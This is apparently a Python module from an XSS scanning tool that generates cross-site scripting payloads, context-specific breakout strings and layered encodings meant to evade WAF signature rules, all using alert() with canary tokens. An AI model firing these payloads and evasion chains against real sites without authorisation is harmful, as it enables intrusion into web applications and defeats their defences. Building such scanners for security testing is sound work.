from __future__ import annotations

import random
import secrets
from dataclasses import dataclass

from xsscane.payloads import encoders


@dataclass
class Payload:
    value: str       # the exact string injected into the target
    canary: str      # unique token expected back on reflection / execution
    technique: str   # label of the transform chain applied
    base: str        # original template before mutation
    decoded: str     # the executable form that must appear un-escaped to fire


class PolymorphicPayloadGenerator:
    """Produces unique payload variants per scan so that no two requests share a
    static signature, defeating signature/hash based WAF rules."""

    BASE_TEMPLATES = [
        "<script>alert('{c}')</script>",
        "\"><script>alert('{c}')</script>",
        "'><img src=x onerror=alert('{c}')>",
        "<img src=x onerror=alert('{c}')>",
        "<svg/onload=alert('{c}')>",
        "<body onload=alert('{c}')>",
        "<details open ontoggle=alert('{c}')>",
        "<iframe src=javascript:alert('{c}')>",
        "<x onpointerover=alert('{c}') style=display:block>x</x>",
        # Modern vectors that survive many tag/attribute blacklists.
        "<svg><animate onbegin=alert('{c}') attributeName=x dur=1s></svg>",
        "<input autofocus onfocus=alert('{c}')>",
        "<video><source onerror=alert('{c}')></video>",
        "<marquee onstart=alert('{c}')>x</marquee>",
    ]

    # Context-specific breakout sequences used by the smart fuzzer. Each must
    # escape the reflection context before it can introduce executable markup.
    HTML_BREAKOUTS = [
        "<svg onload=alert('{c}')>",
        "<img src=x onerror=alert('{c}')>",
        "</textarea><svg onload=alert('{c}')>",
        "<svg><animate onbegin=alert('{c}') attributeName=x dur=1s></svg>",
    ]
    SCRIPT_BREAKOUTS = [
        "';alert('{c}');//",
        "\";alert('{c}');//",
        "</script><svg onload=alert('{c}')>",
    ]
    COMMENT_BREAKOUTS = [
        "--><svg onload=alert('{c}')>",
    ]
    # URI sinks (href / src / formaction …): a javascript:/data: value executes
    # without breaking out of the attribute, so the original value is NOT prefixed.
    URI_BREAKOUTS = [
        "javascript:alert('{c}')",
        "javascript:alert(`{c}`)",
        "data:text/html,<script>alert('{c}')</script>",
    ]

    # Transforms unlocked progressively by --evasion level.
    _TRANSFORMS = {
        1: [encoders.url_encode, encoders.case_mutation],
        2: [encoders.double_url_encode, encoders.html_entity_decimal, encoders.html_entity_hex],
        3: [
            encoders.js_unicode_escape,
            encoders.js_hex_escape,
            encoders.unicode_overlong,
            encoders.base64_eval,
        ],
    }

    def __init__(self, evasion_level: int = 2):
        self.evasion_level = max(0, min(3, evasion_level))

    @staticmethod
    def token() -> str:
        return "x" + secrets.token_hex(5)

    def base_payloads(self) -> list[Payload]:
        payloads = []
        for template in self.BASE_TEMPLATES:
            canary = self.token()
            value = template.format(c=canary)
            payloads.append(Payload(value, canary, "raw", template, decoded=value))
        return payloads

    def _active_transforms(self):
        transforms = []
        for level in range(1, self.evasion_level + 1):
            transforms.extend(self._TRANSFORMS.get(level, []))
        return transforms

    def mutate(self, payload: Payload) -> list[Payload]:
        """Return encoded/obfuscated variants of a payload using the enabled
        evasion transforms. The canary is preserved so detection stays reliable."""
        variants = []
        for transform in self._active_transforms():
            try:
                mutated = transform(payload.value)
            except Exception:
                continue
            if mutated and mutated != payload.value:
                variants.append(
                    Payload(mutated, payload.canary, transform.__name__, payload.base, payload.decoded)
                )
        return variants

    def _attribute_breakouts(self, quote: str) -> list[str]:
        # When the reflection sits inside a quoted attribute we must close that
        # quote first; an unquoted value only needs a space to start a new
        # attribute such as an event handler.
        if quote in ("\"", "'"):
            return [
                f"{quote}><svg onload=alert('{{c}}')>",
                f"{quote} onmouseover=alert('{{c}}') x={quote}",
                f"{quote} autofocus onfocus=alert('{{c}}') x={quote}",
            ]
        return [
            "><svg onload=alert('{c}')>",
            " onmouseover=alert('{c}') x=",
            " autofocus onfocus=alert('{c}') x=",
        ]

    def context_payloads(self, context: str, original: str, quote: str = "") -> list[Payload]:
        """Build mutation-based payloads tailored to a reflection context.

        The original parameter value is preserved as a prefix so the request body
        still looks benign to signature-based WAFs; the breakout is appended. The
        ``decoded`` field holds the exact breakout that must survive un-escaped for
        the finding to be confirmed."""
        if context == "script":
            templates = self.SCRIPT_BREAKOUTS
        elif context == "comment":
            templates = self.COMMENT_BREAKOUTS
        elif context == "attribute":
            templates = self._attribute_breakouts(quote)
        elif context == "uri":
            templates = self.URI_BREAKOUTS
        else:
            templates = self.HTML_BREAKOUTS

        # A URI payload replaces the attribute value outright; everywhere else the
        # original value is kept as a benign-looking prefix.
        prefix = "" if context == "uri" else original

        payloads = []
        for template in templates:
            canary = self.token()
            breakout = template.format(c=canary)
            payloads.append(
                Payload(
                    value=f"{prefix}{breakout}",
                    canary=canary,
                    technique=f"ctx-{context}",
                    base=template,
                    decoded=breakout,
                )
            )
        return payloads

    def generate(self, limit: int = 40) -> list[Payload]:
        pool: list[Payload] = []
        for payload in self.base_payloads():
            pool.append(payload)
            pool.extend(self.mutate(payload))
        random.shuffle(pool)
        return pool[:limit]
